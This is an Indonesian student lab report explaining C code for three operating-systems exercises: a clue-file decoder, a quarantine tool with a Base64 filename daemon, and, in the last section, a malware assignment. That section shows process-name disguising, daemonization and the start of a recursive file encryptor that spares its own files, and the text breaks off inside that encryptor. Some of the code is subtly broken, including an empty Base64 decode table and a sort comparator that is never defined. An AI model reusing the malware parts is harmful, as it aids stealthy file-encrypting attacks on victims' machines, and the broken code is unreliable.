===================[Kelompok IT27]======================

Khumaidi Kharis Az-zacky - 5027241049

Mohamad Arkan Zahir Asyafiq - 5027241120

Abiyyu Raihan Putra Wikanto - 5027241042

============[Laporan Resmi Penjelasan Soal]=============

#soal_1
Pada soal ini, kita diminta untuk membuat sebuah program C untuk memproses file-file clue yang diberikan oleh Cyrus (naga penjaga pintu) untuk mendapatkan password. Program ini melakukan beberapa tahap pengolahan file, mulai dari mengunduh, memfilter, menggabungkan, hingga mendekode konten file.

Penjelasan code:
          
            #include <stdio.h>
            #include <stdlib.h>
            #include <string.h>
            #include <unistd.h>
            #include <sys/stat.h>
            #include <dirent.h>
            #include <ctype.h>
            #include <sys/wait.h>
            #include <fcntl.h>
            #include <time.h>
            #define DOWNLOAD_URL "https://drive.usercontent.google.com/u/0/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download"
            #define ZIP_FILE "Clues.zip"

Bagian ini mengimpor berbagai library yang diperlukan:

stdio.h untuk fungsi-fungsi I/O standar seperti printf, fopen, dsb.
stdlib.h untuk fungsi-fungsi umum seperti malloc, free, dsb.
string.h untuk manipulasi string seperti strcmp, strrchr, dsb.
unistd.h untuk fungsi sistem operasi seperti fork, execl, dsb.
sys/stat.h untuk fungsi yang berhubungan dengan status file dan direktori
dirent.h untuk operasi direktori seperti opendir, readdir, dsb.
ctype.h untuk fungsi klasifikasi karakter seperti isalpha, isdigit, dsb.
sys/wait.h untuk fungsi yang berhubungan dengan proses seperti waitpid
fcntl.h untuk kontrol file seperti open
time.h untuk fungsi yang berhubungan dengan waktu
DOWNLOAD_URL adalah URL untuk mengunduh file Clues.zip
ZIP_FILE adalah nama file ZIP yang akan diunduh

          void print_directory_structure() {
              pid_t pid = fork();
              if (pid == 0) {
                  int devnull = open("/dev/null", O_WRONLY);
                  dup2(devnull, STDOUT_FILENO);
                  close(devnull);
                  
                  execl("/usr/bin/tree", "tree", "--noreport", "-C", NULL);
                  perror("execl");
                  exit(EXIT_FAILURE);
              } else if (pid > 0) {
                  // Parent process
                  int status;
                  waitpid(pid, &status, 0);
              } else {
                  perror("fork");
              }
          }
Fungsi ini mencoba menampilkan struktur direktori menggunakan perintah tree:

fork() membuat proses child
Dalam proses child, output diarahkan ke /dev/null menggunakan dup2
Kemudian perintah tree dijalankan dengan opsi --noreport dan -C (warna)
Proses parent menunggu proses child selesai dengan waitpid

          int directory_exists(const char *path) {
              struct stat st;
              return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
          }
          
          int file_exists(const char *path) {
              struct stat st;
              return (stat(path, &st) == 0 && S_ISREG(st.st_mode));
          }

Dua fungsi untuk memeriksa keberadaan direktori dan file:

directory_exists menggunakan stat untuk mendapatkan informasi tentang path dan memeriksa jika itu adalah direktori
file_exists mirip, tapi memeriksa jika path adalah file reguler

          void download_and_extract() {
              if (directory_exists("Clues")) {
                  printf("Clues directory already exists. Skipping download.\n");
                  return;
              }
          
              printf("Downloading Clues.zip...\n");
              
              pid_t pid = fork();
              if (pid == 0) {
                  execl("/usr/bin/curl", "curl", "-L", "-o", ZIP_FILE, DOWNLOAD_URL, NULL);
                  perror("execl");
                  exit(EXIT_FAILURE);
              } else if (pid > 0) {
                  int status;
                  waitpid(pid, &status, 0);
                  if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                      printf("Download complete. Extracting...\n");
                      
                      pid_t unzip_pid = fork();
                      if (unzip_pid == 0) {
                          execl("/usr/bin/unzip", "unzip", ZIP_FILE, NULL);
                          perror("execl");
                          exit(EXIT_FAILURE);
                      } else if (unzip_pid > 0) {
                          int unzip_status;
                          waitpid(unzip_pid, &unzip_status, 0);
                          if (WIFEXITED(unzip_status) && WEXITSTATUS(unzip_status) == 0) {
                              printf("Extraction complete. Removing ZIP file...\n");
                              
                              if (remove(ZIP_FILE) == 0) {
                                  printf("ZIP file removed successfully.\n");
                              } else {
                                  perror("remove");
                              }
                              
                              printf("Ensuring correct directory structure...\n");
                          } else {
                              printf("Extraction failed.\n");
                          }
                      } else {
                          perror("fork");
                      }
                  } else {
                      printf("Download failed.\n");
                  }
              } else {
                  perror("fork");
              }
          }

Fungsi untuk mengunduh dan mengekstrak file Clues.zip:

Pertama memeriksa apakah direktori Clues sudah ada, jika ada, proses dilewati
Menggunakan fork() untuk membuat proses child yang menjalankan curl untuk mengunduh file
Parent process menunggu download selesai
Jika download berhasil, membuat proses child lain untuk menjalankan unzip
Setelah ekstraksi berhasil, file ZIP dihapus menggunakan remove()

          int is_valid_filename(const char *filename) {
              const char *base = strrchr(filename, '/');
              if (base) {
                  base++;
              } else {
                  base = filename;
              }
              
              // Get the extension
              const char *ext = strrchr(base, '.');
              if (!ext) {
                  return 0;
              }
              
              if (ext - base != 1) {
                  return 0;
              }
              
              char c = base[0];
              return (isalpha(c) || isdigit(c));
          }

Fungsi untuk memeriksa jika sebuah nama file valid (satu huruf atau satu angka):

Pertama, mendapatkan nama file tanpa path menggunakan strrchr()
Kemudian, mendapatkan ekstensi file (setelah titik terakhir)
Memeriksa jika panjang nama file (tanpa ekstensi) tepat satu karakter
Terakhir, memeriksa jika karakter tersebut adalah huruf atau angka

          void filter_files() {
              if (!directory_exists("Filtered")) {
                  if (mkdir("Filtered", 0755) != 0) {
                      perror("mkdir");
                      return;
                  }
                  printf("Created Filtered directory.\n");
              }
          
              const char *clue_dirs[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
              for (int i = 0; i < 4; i++) {
                  DIR *dir = opendir(clue_dirs[i]);
                  if (!dir) {
                      printf("Failed to open directory: %s\n", clue_dirs[i]);
                      continue;
                  }
                  
                  struct dirent *entry;
                  char filenames[100][256];
                  int file_count = 0;
                  
                  while ((entry = readdir(dir)) != NULL) {
                      if (entry->d_type == DT_REG) {
                          strcpy(filenames[file_count], entry->d_name);
                          file_count++;
                      }
                  }
                  closedir(dir);
                  
                  for (int j = 0; j < file_count; j++) {
                      char src_path[512];
                      snprintf(src_path, sizeof(src_path), "%s/%s", clue_dirs[i], filenames[j]);
                      
                      if (is_valid_filename(filenames[j])) {
                          char dst_path[512];
                          snprintf(dst_path, sizeof(dst_path), "Filtered/%s", filenames[j]);
                          
                          FILE *src = fopen(src_path, "r");
                          if (!src) {
                              perror("fopen source");
                              continue;
                          }
                          
                          FILE *dst = fopen(dst_path, "w");
                          if (!dst) {
                              perror("fopen destination");
                              fclose(src);
                              continue;
                          }
                          
                          char buffer[1024];
                          size_t bytes;
                          while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                              fwrite(buffer, 1, bytes, dst);
                          }
                          
                          fclose(src);
                          fclose(dst);
                          
                          if (remove(src_path) == 0) {
                              printf("Moved %s to Filtered directory and removed original.\n", filenames[j]);
                          } else {
                              perror("remove");
                          }
                      } else {
                          if (remove(src_path) == 0) {
                              printf("Removed invalid file: %s\n", filenames[j]);
                          } else {
                              perror("remove");
                          }
                      }
                  }
              }
          }

Fungsi untuk memfilter file-file:

Membuat direktori Filtered jika belum ada
Menelusuri setiap direktori ClueA, ClueB, ClueC, dan ClueD
Mengumpulkan semua nama file dalam array
Untuk setiap file, memeriksa jika namanya valid (satu huruf/angka)
File yang valid disalin ke direktori Filtered dan file aslinya dihapus
File yang tidak valid langsung dihapus

          void combine_files() {
              DIR *dir = opendir("Filtered");
              if (!dir) {
                  printf("Failed to open Filtered directory.\n");
                  return;
              }
              
              char *digit_files[100];
              char *letter_files[100];
              int digit_count = 0;
              int letter_count = 0;
              
              struct dirent *entry;
              while ((entry = readdir(dir)) != NULL) {
                  if (entry->d_type == DT_REG) {
                      char *filename = strdup(entry->d_name);
                      if (isdigit(filename[0])) {
                          digit_files[digit_count++] = filename;
                      } else if (isalpha(filename[0])) {
                          letter_files[letter_count++] = filename;
                      }
                  }
              }
              
              closedir(dir);
              
              qsort(digit_files, digit_count, sizeof(char *), compare_filenames);
              qsort(letter_files, letter_count, sizeof(char *), compare_filenames);
              
              FILE *combined = fopen("Combined.txt", "w");
              if (!combined) {
                  perror("fopen Combined.txt");
                  return;
              }
              
              int digit_idx = 0;
              int letter_idx = 0;
              
              while (digit_idx < digit_count || letter_idx < letter_count) {
                  if (digit_idx < digit_count) {
                      char path[512];
                      snprintf(path, sizeof(path), "Filtered/%s", digit_files[digit_idx]);
                      
                      FILE *file = fopen(path, "r");
                      if (file) {
                          char buffer[1024];
                          size_t bytes;
                          while ((bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
                              fwrite(buffer, 1, bytes, combined);
                          }
                          fclose(file);
                          printf("Combined content from %s\n", digit_files[digit_idx]);
                          
                          if (remove(path) == 0) {
                              printf("Removed %s after combining.\n", digit_files[digit_idx]);
                          } else {
                              perror("remove");
                          }
                          
                          digit_idx++;
                      }
                  }
                  
                  if (letter_idx < letter_count) {
                      char path[512];
                      snprintf(path, sizeof(path), "Filtered/%s", letter_files[letter_idx]);
                      
                      FILE *file = fopen(path, "r");
                      if (file) {
                          char buffer[1024];
                          size_t bytes;
                          while ((bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
                              fwrite(buffer, 1, bytes, combined);
                          }
                          fclose(file);
                          printf("Combined content from %s\n", letter_files[letter_idx]);
                          
                          if (remove(path) == 0) {
                              printf("Removed %s after combining.\n", letter_files[letter_idx]);
                          } else {
                              perror("remove");
                          }
                          
                          letter_idx++;
                      }
                  }
              }
              
              fclose(combined);
              printf("Combined all files into Combined.txt\n");
              
              for (int i = 0; i < digit_count; i++) {
                  free(digit_files[i]);
              }
              for (int i = 0; i < letter_count; i++) {
                  free(letter_files[i]);
              }
          }

Fungsi untuk menggabungkan konten file:

Membuka direktori Filtered dan mengumpulkan semua file
Memisahkan file menjadi dua kelompok: yang dimulai dengan angka dan yang dimulai dengan huruf
Mengurutkan kedua kelompok file menggunakan qsort()
Membuka file Combined.txt untuk penulisan
Menggabungkan file-file dengan urutan bergantian: angka, huruf, angka, huruf, dst.
Setiap file yang sudah digabungkan dihapus
Membebaskan memori yang dialokasikan untuk nama file

          char rot13(char c) {
              if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')) {
                  char offset = (c >= 'a' && c <= 'z') ? 'a' : 'A';
                  return ((c - offset + 13) % 26) + offset;
              }
              return c;
          }
          
          void decode_file() {
              FILE *combined = fopen("Combined.txt", "r");
              if (!combined) {
                  printf("Failed to open Combined.txt\n");
                  return;
              }
              
              FILE *decoded = fopen("Decoded.txt", "w");
              if (!decoded) {
                  perror("fopen Decoded.txt");
                  fclose(combined);
                  return;
              }
              
              int c;
              while ((c = fgetc(combined)) != EOF) {
                  fputc(rot13((char)c), decoded);
              }
              
              fclose(combined);
              fclose(decoded);
              printf("Decoded Combined.txt to Decoded.txt using ROT13\n");
          }

Fungsi untuk mendekode file menggunakan ROT13:

rot13() mengimplementasikan algoritma ROT13 yang menggeser huruf 13 posisi
decode_file() membuka file Combined.txt dan Decoded.txt
Membaca setiap karakter dari Combined.txt, mendekodenya dengan ROT13, dan menuliskannya ke Decoded.txt

          void check_password() {
              FILE *decoded = fopen("Decoded.txt", "r");
              if (!decoded) {
                  printf("Failed to open Decoded.txt. Please decode the file first.\n");
                  return;
              }
              
              char password[256] = {0};
              if (fgets(password, sizeof(password), decoded) != NULL) {
                  size_t len = strlen(password);
                  if (len > 0 && password[len-1] == '\n') {
                      password[len-1] = '\0';
                  }
                  
                  printf("Password found: %s\n", password);
                  printf("Please input this password at the 'lokasi' mentioned in the problem.\n");
              } else {
                  printf("Could not read password from file.\n");
              }
              
              fclose(decoded);
          }

Fungsi untuk memeriksa password:

Membuka file Decoded.txt
Membaca baris pertama file sebagai password
Menghapus karakter newline dari akhir password jika ada
Menampilkan password ke pengguna

          void display_usage() {
              printf("Usage: ./action [-m Mode]\n");
              printf("Modes:\n");
              printf("  Filter   - Filter files with single letter/digit names\n");
              printf("  Combine  - Combine filtered files into a single file\n");
              printf("  Decode   - Decode the combined file using ROT13\n");
              printf("  Check    - Check the password from the decoded file\n");
              printf("Without arguments, it will download and extract the clues.\n");
          }

Fungsi untuk menampilkan cara penggunaan program.

          int main(int argc, char *argv[]) {
              if (argc == 1) {
                  download_and_extract();
              } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
                  if (strcmp(argv[2], "Filter") == 0) {
                      filter_files();
                  } else if (strcmp(argv[2], "Combine") == 0) {
                      combine_files();
                  } else if (strcmp(argv[2], "Decode") == 0) {
                      decode_file();
                  } else if (strcmp(argv[2], "Check") == 0) {
                      check_password();
                  } else {
                      printf("Invalid mode: %s\n", argv[2]);
                      display_usage();
                      return 1;
                  }
              } else {
                  display_usage();
                  return 1;
              }
              
              return 0;
          }

Fungsi main:

Memeriksa argumen command line
Jika tidak ada argumen, menjalankan download_and_extract()
Jika argumennya -m, menjalankan fungsi yang sesuai dengan mode yang diberikan
Jika argumen tidak valid, menampilkan pesan kesalahan dan bantuan penggunaan

#soal_2
Program ini dirancang untuk membantu Kanade mengidentifikasi dan mengisolasi malware dengan menyediakan alat pengelolaan file yang dapat memindahkan, mengisolasi, dan mengembalikan file-file yang mencurigakan, sambil secara otomatis mendekripsi nama file yang dienkode dengan Base64.

Penjelasan Code:

          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <dirent.h>
          #include <sys/stat.h>
          #include <sys/types.h>
          #include <sys/wait.h>
          #include <fcntl.h>
          #include <time.h>
          #include <signal.h>
          #include <errno.h>
          #include <stdarg.h>
          #include <linux/limits.h>
          
Ini adalah daftar header yang dibutuhkan oleh program
Termasuk fungsi untuk manipulasi file, proses, sinyal, waktu, dan variabel argumen
linux/limits.h digunakan untuk konstanta PATH_MAX yang menentukan panjang maksimum path file

          #define DOWNLOAD_URL "https://drive.usercontent.google.com/u/0/uc?id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS&export=download"
          #define ZIP_FILE "starterkit.zip"
          #define LOG_FILE "activity.log"
          #define STARTER_KIT_DIR "starter_kit"
          #define QUARANTINE_DIR "quarantine"
          #define DAEMON_PID_FILE "/tmp/decrypt_daemon.pid"

Mendefinisikan konstanta yang digunakan dalam program
URL untuk mengunduh starter kit
Nama file zip, file log, dan direktori
File untuk menyimpan PID (Process ID) dari daemon

          void write_log(const char *format, ...) {
              FILE *log_file = fopen(LOG_FILE, "a");
              if (!log_file) {
                  perror("Error opening log file");
                  return;
              }
          
              time_t now = time(NULL);
              struct tm *time_info = localtime(&now);
              
              fprintf(log_file, "[%02d-%02d-%04d][%02d:%02d:%02d] - ", 
                      time_info->tm_mday, 
                      time_info->tm_mon + 1, 
                      time_info->tm_year + 1900,
                      time_info->tm_hour,
                      time_info->tm_min,
                      time_info->tm_sec);
          
              va_list args;
              va_start(args, format);
              vfprintf(log_file, format, args);
              va_end(args);
          
              fprintf(log_file, "\n");
              fclose(log_file);
          }

Fungsi untuk menulis entri log ke file activity.log
Membuka file log dalam mode append ('a')
Mendapatkan waktu saat ini dan memformatnya sesuai format yang diminta: [dd-mm-YYYY][HH:MM]
Menggunakan fungsi variadic untuk memungkinkan format string seperti printf
Menutup file setelah selesai menulis

          int directory_exists(const char *path) {
              struct stat st;
              return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
          }
          
          void create_directory_if_not_exists(const char *path) {
              if (!directory_exists(path)) {
                  if (mkdir(path, 0755) != 0) {
                      perror("Error creating directory");
                      exit(EXIT_FAILURE);
                  }
              }
          }
          
directory_exists: Memeriksa apakah direktori sudah ada dengan menggunakan fungsi stat
create_directory_if_not_exists: Membuat direktori jika belum ada dengan izin 0755 (dapat dibaca, ditulis pemilik, dibaca dan dieksekusi oleh semua)

          void download_and_extract() {
              if (directory_exists(STARTER_KIT_DIR)) {
                  printf("Starter kit directory already exists. Skipping download.\n");
                  return;
              }
          
              pid_t pid = fork();
              if (pid == 0) {
                  execl("/usr/bin/curl", "curl", "-L", "-o", ZIP_FILE, DOWNLOAD_URL, NULL);
                  perror("execl curl failed");
                  exit(EXIT_FAILURE);
              } else if (pid > 0) {
                  int status;
                  waitpid(pid, &status, 0);
                  if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
                      fprintf(stderr, "Error downloading file\n");
                      exit(EXIT_FAILURE);
                  }
              } else {
                  perror("fork failed");
                  exit(EXIT_FAILURE);
              }
          
              create_directory_if_not_exists(STARTER_KIT_DIR);
          
              pid = fork();
              if (pid == 0) {
                  execl("/usr/bin/unzip", "unzip", ZIP_FILE, "-d", STARTER_KIT_DIR, NULL);
                  perror("execl unzip failed");
                  exit(EXIT_FAILURE);
              } else if (pid > 0) {
                  int status;
                  waitpid(pid, &status, 0);
                  if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
                      fprintf(stderr, "Error extracting file\n");
                      exit(EXIT_FAILURE);
                  }
              } else {
                  perror("fork failed");
                  exit(EXIT_FAILURE);
              }
          
              if (unlink(ZIP_FILE) != 0) {
                  perror("Error removing zip file");
              }
          
              printf("Successfully downloaded and extracted starter kit\n");
          }

Mengecek apakah direktori starter kit sudah ada; jika sudah, lewati proses download
Menggunakan fork() dan execl() untuk menjalankan perintah curl dan mendownload file zip
Menunggu proses download selesai dengan waitpid() dan memeriksa status error
Membuat direktori starter kit jika belum ada
Menggunakan proses yang sama untuk menjalankan unzip
Menghapus file zip setelah ekstraksi selesai dengan unlink()
Perhatikan bahwa ini tidak menggunakan system() sesuai persyaratan

          static const unsigned char base64_table[65] =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
          
          static const unsigned char base64_reverse_table[256] = {
          };
          
          char* base64_decode(const char *src, size_t *out_len) {
              size_t src_len = strlen(src);
              size_t target_len = src_len / 4 * 3;
              char *target = malloc(target_len + 1);
              if (!target)
                  return NULL;
          
              size_t i, j;
              for (i = 0, j = 0; i < src_len; i += 4, j += 3) {
                  unsigned char a = base64_reverse_table[(unsigned char)src[i]];
                  unsigned char b = (i + 1 < src_len) ? base64_reverse_table[(unsigned char)src[i + 1]] : 0;
                  unsigned char c = (i + 2 < src_len) ? base64_reverse_table[(unsigned char)src[i + 2]] : 0;
                  unsigned char d = (i + 3 < src_len) ? base64_reverse_table[(unsigned char)src[i + 3]] : 0;
          
                  target[j] = (a << 2) | (b >> 4);
                  if (i + 2 < src_len)
                      target[j + 1] = (b << 4) | (c >> 2);
                  if (i + 3 < src_len)
                      target[j + 2] = (c << 6) | d;
              }
          
              *out_len = j;
              target[j] = '\0';
              return target;
          }
          
          int is_base64_encoded(const char *str) {
              size_t len = strlen(str);
              
              if (len % 4 != 0) return 0;
              
              for (size_t i = 0; i < len; i++) {
                  if (!((str[i] >= 'A' && str[i] <= 'Z') ||
                        (str[i] >= 'a' && str[i] <= 'z') ||
                        (str[i] >= '0' && str[i] <= '9') ||
                        str[i] == '+' || str[i] == '/' ||
                        (i >= len - 2 && str[i] == '='))) {
                      return 0;
                  }
              }
              
              return 1;
          }

Mendeklarasikan tabel karakter Base64 dan tabel terbalik untuk dekoding
base64_decode: Fungsi utama untuk mendekode string Base64 menjadi data asli

Mengalokasikan memori untuk hasil dekode
Melakukan proses dekode dengan operasi bitwise
Mengembalikan string hasil dekode dan panjangnya


is_base64_encoded: Memeriksa apakah string adalah Base64 valid

Memeriksa panjangnya (harus kelipatan 4)
Memeriksa setiap karakter apakah termasuk dalam alfabet Base64

          pid_t read_daemon_pid() {
              FILE *pid_file = fopen(DAEMON_PID_FILE, "r");
              if (!pid_file) {
                  return -1;
              }
          
              pid_t pid;
              if (fscanf(pid_file, "%d", &pid) != 1) {
                  fclose(pid_file);
                  return -1;
              }
          
              fclose(pid_file);
              return pid;
          }
          
          void write_daemon_pid(pid_t pid) {
              FILE *pid_file = fopen(DAEMON_PID_FILE, "w");
              if (!pid_file) {
                  perror("Failed to create PID file");
                  exit(EXIT_FAILURE);
              }
          
              fprintf(pid_file, "%d", pid);
              fclose(pid_file);
          }

read_daemon_pid: Membaca PID daemon dari file

Jika file tidak ada atau tidak dapat dibaca, mengembalikan -1


write_daemon_pid: Menulis PID daemon ke file

Menciptakan atau menimpa file PID yang ada

          void start_decrypt_daemon() {
              if (read_daemon_pid() > 0) {
                  printf("Decrypt daemon is already running\n");
                  return;
              }
          
              create_directory_if_not_exists(QUARANTINE_DIR);
          
              pid_t pid = fork();
              if (pid < 0) {
                  perror("Fork failed");
                  exit(EXIT_FAILURE);
              } else if (pid > 0) {
                  printf("Started decryption daemon with PID %d\n", pid);
                  write_daemon_pid(pid);
                  write_log("Successfully started decryption process with PID %d.", pid);
                  return;
              }

              if (setsid() < 0) {
                  perror("setsid failed");
                  exit(EXIT_FAILURE);
              }

              if (chdir("/") < 0) {
                  perror("chdir failed");
                  exit(EXIT_FAILURE);
              }

              close(STDIN_FILENO);
              close(STDOUT_FILENO);
              close(STDERR_FILENO);
          
              open("/dev/null", O_RDONLY);
              open("/dev/null", O_WRONLY);
              open("/dev/null", O_WRONLY);

              while (1) {
                  DIR *dir = opendir(QUARANTINE_DIR);
                  if (!dir) {
                      sleep(5);
                      continue;
                  }
          
                  struct dirent *entry;
                  while ((entry = readdir(dir)) != NULL) {
                      if (entry->d_type == DT_REG && is_base64_encoded(entry->d_name)) {
                          size_t decoded_len;
                          char *decoded_name = base64_decode(entry->d_name, &decoded_len);
                          if (!decoded_name)
                              continue;

                          char old_path[PATH_MAX];
                          char new_path[PATH_MAX];
                          snprintf(old_path, PATH_MAX, "%s/%s", QUARANTINE_DIR, entry->d_name);
                          snprintf(new_path, PATH_MAX, "%s/%s", QUARANTINE_DIR, decoded_name);

                          if (rename(old_path, new_path) == 0) {
                          }
          
                          free(decoded_name);
                      }
                  }
          
                  closedir(dir);
                  sleep(5);
              }

              exit(EXIT_SUCCESS);
          }

Memeriksa apakah daemon sudah berjalan dengan membaca file PID
Memastikan direktori karantina ada
Menggunakan fork() untuk membuat proses child
Proses parent:

Mencatat PID daemon dan menulis log
Kembali ke main


Proses child:

Menjadi daemon dengan setsid() untuk memisahkan dari terminal
Mengubah direktori kerja ke root
Menutup file descriptor standar dan mengalihkannya ke /dev/null
Menjalankan loop utama daemon:

Membuka direktori karantina
Mencari file dengan nama yang dikodekan Base64
Mendekode nama file
Mengganti nama file dengan nama yang sudah didekode
Tidur 5 detik sebelum memeriksa lagi

          void stop_decrypt_daemon() {
              pid_t daemon_pid = read_daemon_pid();
              if (daemon_pid <= 0) {
                  printf("Decrypt daemon is not running\n");
                  return;
              }

              if (kill(daemon_pid, SIGTERM) == 0) {
                  printf("Sent shutdown signal to decrypt daemon (PID: %d)\n", daemon_pid);
                  write_log("Successfully shut off decryption process with PID %d.", daemon_pid);

                  if (unlink(DAEMON_PID_FILE) != 0) {
                      perror("Failed to remove PID file");
                  }
              } else {
                  perror("Failed to send signal to daemon");
              }
          }

Membaca PID daemon, jika tidak ditemukan, tampilkan pesan dan kembali
Mengirim sinyal SIGTERM ke daemon untuk menghentikannya
Jika berhasil, menulis log dan menghapus file PID
Jika gagal, menampilkan pesan error

          void move_file(const char *src_dir, const char *dst_dir, const char *filename) {
              char src_path[PATH_MAX];
              char dst_path[PATH_MAX];
              
              snprintf(src_path, PATH_MAX, "%s/%s", src_dir, filename);
              snprintf(dst_path, PATH_MAX, "%s/%s", dst_dir, filename);
              
              if (rename(src_path, dst_path) == 0) {
                  printf("Moved %s from %s to %s\n", filename, src_dir, dst_dir);
                  if (strcmp(dst_dir, QUARANTINE_DIR) == 0) {
                      write_log("%s - Successfully moved to quarantine directory.", filename);
                  } else if (strcmp(dst_dir, STARTER_KIT_DIR) == 0) {
                      write_log("%s - Successfully returned to starter kit directory.", filename);
                  }
              } else {
                  perror("Error moving file");
              }
          }

Membuat path lengkap untuk file sumber dan tujuan
Memindahkan file dengan rename()
Jika berhasil, mencetak pesan dan menulis log sesuai arah pemindahan
Jika gagal, menampilkan pesan error

          void quarantine_files() {
              DIR *dir = opendir(STARTER_KIT_DIR);
              if (!dir) {
                  perror("Error opening starter kit directory");
                  return;
              }
          
              create_directory_if_not_exists(QUARANTINE_DIR);
          
              struct dirent *entry;
              while ((entry = readdir(dir)) != NULL) {
                  if (entry->d_type == DT_REG) {
                      move_file(STARTER_KIT_DIR, QUARANTINE_DIR, entry->d_name);
                  }
              }
          
              closedir(dir);
          }
          
          void return_files() {
              DIR *dir = opendir(QUARANTINE_DIR);
              if (!dir) {
                  perror("Error opening quarantine directory");
                  return;
              }
          
              create_directory_if_not_exists(STARTER_KIT_DIR);
          
              struct dirent *entry;
              while ((entry = readdir(dir)) != NULL) {
                  if (entry->d_type == DT_REG) {
                      move_file(QUARANTINE_DIR, STARTER_KIT_DIR, entry->d_name);
                  }
              }
          
              closedir(dir);
          }

quarantine_files: Memindahkan semua file dari starter kit ke karantina

Membuka direktori starter kit dan memastikan direktori karantina ada
Memindahkan setiap file reguler (bukan direktori)


return_files: Memindahkan semua file dari karantina kembali ke starter kit

Mirip dengan quarantine_files tetapi arah pemindahan berlawanan

          void eradicate_files() {
              DIR *dir = opendir(QUARANTINE_DIR);
              if (!dir) {
                  perror("Error opening quarantine directory");
                  return;
              }
          
              struct dirent *entry;
              while ((entry = readdir(dir)) != NULL) {
                  if (entry->d_type == DT_REG) {
                      char path[PATH_MAX];
                      snprintf(path, PATH_MAX, "%s/%s", QUARANTINE_DIR, entry->d_name);
                      
                      if (unlink(path) == 0) {
                          printf("Deleted %s\n", entry->d_name);
                          write_log("%s - Successfully deleted.", entry->d_name);
                      } else {
                          perror("Error deleting file");
                      }
                  }
              }
          
              closedir(dir);
          }

Membuka direktori karantina
Untuk setiap file reguler dalam direktori:

Membuat path lengkap file
Menghapus file dengan unlink()
Jika berhasil, mencetak pesan dan menulis log
Jika gagal, menampilkan pesan error

          void display_usage() {
              printf("Usage: ./starterkit [OPTION]\n");
              printf("Options:\n");
              printf("  --decrypt     Start the decryption daemon\n");
              printf("  --quarantine  Move files from starter kit to quarantine\n");
              printf("  --return      Move files from quarantine to starter kit\n");
              printf("  --eradicate   Delete all files in quarantine\n");
              printf("  --shutdown    Stop the decryption daemon\n");
          }

Menampilkan informasi cara penggunaan program
Daftar semua opsi yang tersedia dengan deskripsi singkat

          int main(int argc, char *argv[]) {
              FILE *log_file = fopen(LOG_FILE, "a");
              if (log_file) {
                  fclose(log_file);
              } else {
                  perror("Error creating log file");
              }
          
              if (argc == 1) {
                  download_and_extract();
                  return 0;
              }
          
              if (argc == 2) {
                  if (strcmp(argv[1], "--decrypt") == 0) {
                      start_decrypt_daemon();
                  } else if (strcmp(argv[1], "--quarantine") == 0) {
                      quarantine_files();
                  } else if (strcmp(argv[1], "--return") == 0) {
                      return_files();
                  } else if (strcmp(argv[1], "--eradicate") == 0) {
                      eradicate_files();
                  } else if (strcmp(argv[1], "--shutdown") == 0) {
                      stop_decrypt_daemon();
                  } else {
                      display_usage();
                      return 1;
                  }
              } else {
                  display_usage();
                  return 1;
              }
          
              return 0;
          }

Memastikan file log ada dengan mencoba membukanya
Jika tidak ada argumen (argc == 1), program mendownload dan mengekstrak starter kit
Jika terdapat satu argumen (argc == 2):

--decrypt: Menjalankan daemon dekripsi
--quarantine: Memindahkan file ke karantina
--return: Mengembalikan file dari karantina
--eradicate: Menghapus file karantina
--shutdown: Menghentikan daemon
Argumen lain: Menampilkan cara penggunaan

Jika jumlah argumen tidak sesuai, menampilkan cara penggunaan


#soal_3

Pada soal ini kami disuruh membuat malware yang dapat menginfeksi perangkat korban dengan mengganti namanya, membuat enkriptor file dengan metode rekursif, menyebarkan malware ke mesin korban, dan membuat fork bomb & miner.

          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <dirent.h>
          #include <sys/wait.h>
          #include <time.h>
          #include <signal.h>
          #include <sys/prctl.h>
          #include <sys/stat.h>
          #include <errno.h>
          
          char *g_argv0;

Mengambil fungsi untuk file, direktori, proses, waktu, sinyal, dan lain-lain serta memasukkan variabel global untuk menyimpan nama program yang nantinya akan dipalai untuk mengubah nama proses.

          void write_log(const char *message) {
              FILE *log = fopen("activity.log", "a");
              if (!log) return;
              time_t now = time(NULL);
              struct tm *t = localtime(&now);
              fprintf(log, "[%02d-%02d-%d][%02d:%02d:%02d] - %s\n",
                      t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
                      t->tm_hour, t->tm_min, t->tm_sec, message);
              fclose(log);
          }

Membuat activity.log dengan format tulisan Tanggal, Jam-Menit-Detik, dan Pesan.

          void set_process_name(const char *new_name) {
              prctl(PR_SET_NAME, new_name, 0, 0, 0);
              if(g_argv0) {
                  memset(g_argv0, 0, strlen(g_argv0));
                  strncpy(g_argv0, new_name, strlen(new_name));
              }
          }

MMengubah nama yang ditampil di daftar proses.

          void daemonize() {
              pid_t pid = fork();
              if(pid < 0) exit(EXIT_FAILURE);
              if(pid > 0) exit(EXIT_SUCCESS);
              if(setsid() < 0) exit(EXIT_FAILURE);
              umask(0);
          }

Membuat fork yang memecah menjadi dua proses dimana proses parent akan segera keluar sedangkan proses child akan lanjut sebagai daemon. 

          void signal_handler(int sig) {
              kill(0, SIGTERM);
              exit(0);
          }

Ketika menerima SIGTERM atau SIGINT maka ia akan mengirimnya ke semua proses anak.

          void encrypt_file(const char *filepath, int key) {
              if(strstr(filepath, "runme") != NULL || strstr(filepath, "malware.c") != NULL || strstr(filepath, "activity.log") != NULL)
                  return;
              FILE *fp = fopen(filepath, "rb+");
              if(!fp) return;
              if(fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return; }
              long fsize = ftell(fp);
              if(fsize < 0) { fclose(fp); return; }
              rewind(fp);
              char *buffer = malloc(fsize);
              if(!buffer) { fclose(fp); return; }
              size_t bytesRead = fread(buffer, 1, fsize, fp);
